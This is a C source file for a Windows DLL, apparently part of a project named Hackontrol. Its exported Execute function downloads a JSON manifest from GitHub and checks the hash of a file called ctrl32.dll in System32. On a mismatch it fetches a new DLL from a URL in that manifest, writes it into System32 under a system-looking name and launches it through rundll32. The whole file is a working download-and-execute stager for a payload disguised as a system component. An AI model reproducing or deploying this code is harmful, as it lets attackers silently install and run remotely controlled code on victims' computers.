#include <khopanwin32.h>
#include <khopanstring.h>
#include <khopancurl.h>
#include <openssl/sha.h>
#include <cJSON.h>

#define SHA512_HEXADECIMAL_LENGTH 128

#define CLOSE_HANDLE(x) if(!CloseHandle(x)) KHWin32DialogErrorW(GetLastError(), L"CloseHandle")
#define MESSAGE_BOX(x) MessageBoxW(NULL, x, L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL)
#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_CTRL32      L"ctrl32.dll"
#define FILE_RUNDLL32    L"rundll32.exe"
#define FOLDER_SYSTEM32  L"System32"
#define FUNCTION_CTRL32  L"Execute"
#define URL_VERSION_FILE "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/version.json"

static size_t data_write(BYTE* data, size_t size, size_t count, void** output);
static size_t file_write(void* data, size_t size, size_t count, FILE* stream);
static void executeProgram();

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	CURLcode code = curl_global_init(CURL_GLOBAL_ALL);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_global_init");
		return;
	}

	CURL* curl = curl_easy_init();

	if(!curl) {
		KHCURLDialogErrorW(code, L"curl_easy_init");
		goto globalCleanup;
	}

	code = curl_easy_setopt(curl, CURLOPT_URL, URL_VERSION_FILE);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_setopt");
		goto easyCleanup;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, data_write);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_setopt");
		goto easyCleanup;
	}

	void* versionFile = NULL;
	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &versionFile);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_setopt");
		goto easyCleanup;
	}

	code = curl_easy_perform(curl);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_perform");
		goto easyCleanup;
	}

	if(!versionFile) {
		KHWin32DialogErrorW(MENROLL_E_EMPTY_MESSAGE, L"curl_easy_perform");
		goto easyCleanup;
	}

	cJSON* rootJson = cJSON_Parse(versionFile);
	FREE(versionFile);

	if(!rootJson) {
		MESSAGE_BOX(L"JSON parsing error");
		goto easyCleanup;
	}

	cJSON* hashObject = cJSON_GetObjectItem(rootJson, "hash");

	if(!hashObject) {
		MESSAGE_BOX(L"JSON field 'hash' not found");
		goto deleteJson;
	}

	char* sourceHash = cJSON_GetStringValue(hashObject);

	if(!sourceHash) {
		MESSAGE_BOX(L"JSON field 'hash' is not a string");
		goto deleteJson;
	}

	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();

	if(!pathFolderWindows) {
		KHWin32DialogErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
		goto deleteJson;
	}

	LPWSTR pathFileCtrl32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32 L"\\" FILE_CTRL32, pathFolderWindows);
	FREE(pathFolderWindows);

	if(!pathFileCtrl32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto deleteJson;
	}

	HANDLE fileHandle = CreateFileW(pathFileCtrl32, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(fileHandle == INVALID_HANDLE_VALUE) {
		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	LARGE_INTEGER integer;

	if(!GetFileSizeEx(fileHandle, &integer)) {
		KHWin32DialogErrorW(GetLastError(), L"GetFileSizeEx");
		CLOSE_HANDLE(fileHandle);
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	BYTE* dataBuffer = LocalAlloc(LMEM_FIXED, integer.QuadPart);

	if(!dataBuffer) {
		KHWin32DialogErrorW(GetLastError(), L"LocalAlloc");
		CLOSE_HANDLE(fileHandle);
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	DWORD bytesRead = 0;
	BOOL result = ReadFile(fileHandle, dataBuffer, (DWORD) integer.QuadPart, &bytesRead, NULL);
	CLOSE_HANDLE(fileHandle);

	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"ReadFile");
		FREE(dataBuffer);
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	unsigned char hash[SHA512_DIGEST_LENGTH];
	SHA512(dataBuffer, bytesRead, hash);
	FREE(dataBuffer);
	const char* hexadecimal = "0123456789abcdef";
	char hashBuffer[SHA512_HEXADECIMAL_LENGTH + 1];

	for(unsigned char i = 0; i < SHA512_DIGEST_LENGTH; i++) {
		unsigned char index = i * 2;
		hashBuffer[index] = hexadecimal[(hash[i] >> 4) & 0xF];
		hashBuffer[index + 1] = hexadecimal[hash[i] & 0xF];
	}

	hashBuffer[SHA512_HEXADECIMAL_LENGTH] = 0;

	if(strcmp(hashBuffer, sourceHash) == 0) {
		FREE(pathFileCtrl32);
		executeProgram();
		goto deleteJson;
	}
	
	cJSON* downloadObject = cJSON_GetObjectItem(rootJson, "download");

	if(!downloadObject) {
		MESSAGE_BOX(L"JSON field 'download' not found");
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	char* downloadURL = cJSON_GetStringValue(downloadObject);
	
	if(!downloadURL) {
		MESSAGE_BOX(L"JSON field 'download' is not a string");
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	code = curl_easy_setopt(curl, CURLOPT_URL, downloadURL);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_setopt");
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, file_write);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_setopt");
		FREE(pathFileCtrl32);
		goto deleteJson;
	}

	FILE* file = NULL;
	errno_t errorCode = _wfopen_s(&file, pathFileCtrl32, L"wb");
	FREE(pathFileCtrl32);

	if(errorCode != 0 || !file) {
		KHWin32DialogErrorW(ERROR_CANNOT_MAKE, L"_wfopen_s");
		goto deleteJson;
	}

	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_setopt");
		fclose(file);
		goto deleteJson;
	}

	code = curl_easy_perform(curl);
	fclose(file);

	if(code != CURLE_OK) {
		KHCURLDialogErrorW(code, L"curl_easy_perform");
		goto deleteJson;
	}

	executeProgram();
deleteJson:
	cJSON_Delete(rootJson);
easyCleanup:
	curl_easy_cleanup(curl);
globalCleanup:
	curl_global_cleanup();
}

static size_t data_write(BYTE* data, size_t size, size_t count, void** output) {
	if(!output) {
		return 0;
	}

	BYTE* outputBuffer = *output;
	size_t length = size * count;

	if(!outputBuffer) {
		BYTE* result = LocalAlloc(LMEM_FIXED, length + 1);

		if(!result) {
			KHWin32DialogErrorW(GetLastError(), L"LocalAlloc");
			return 0;
		}

		for(size_t i = 0; i < length; i++) {
			result[i] = data[i];
		}

		result[length] = 0;
		*output = result;
		return length;
	}

	size_t previousLength = strlen(outputBuffer);
	size_t resultLength = previousLength + length;
	BYTE* result = LocalAlloc(LMEM_FIXED, resultLength + 1);

	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"LocalAlloc");
		return 0;
	}

	for(size_t i = 0; i < previousLength; i++) {
		result[i] = outputBuffer[i];
	}

	FREE(outputBuffer);

	for(size_t i = 0; i < length; i++) {
		result[i + previousLength] = data[i];
	}

	result[resultLength] = 0;
	*output = result;
	return length;
}

static size_t file_write(void* data, size_t size, size_t count, FILE* stream) {
	return fwrite(data, size, count, stream);
}

static void executeProgram() {
	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();

	if(!pathFolderWindows) {
		KHWin32DialogErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
		return;
	}

	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32 L"\\" FILE_RUNDLL32, pathFolderWindows);
	FREE(pathFolderWindows);

	if(!pathFileRundll32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		return;
	}

	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;
	BOOL result = CreateProcessW(pathFileRundll32, FILE_RUNDLL32 L" " FILE_CTRL32 L"," FUNCTION_CTRL32, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation);
	FREE(pathFileRundll32);

	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
		return;
	}

	CLOSE_HANDLE(processInformation.hProcess);
	CLOSE_HANDLE(processInformation.hThread);
}
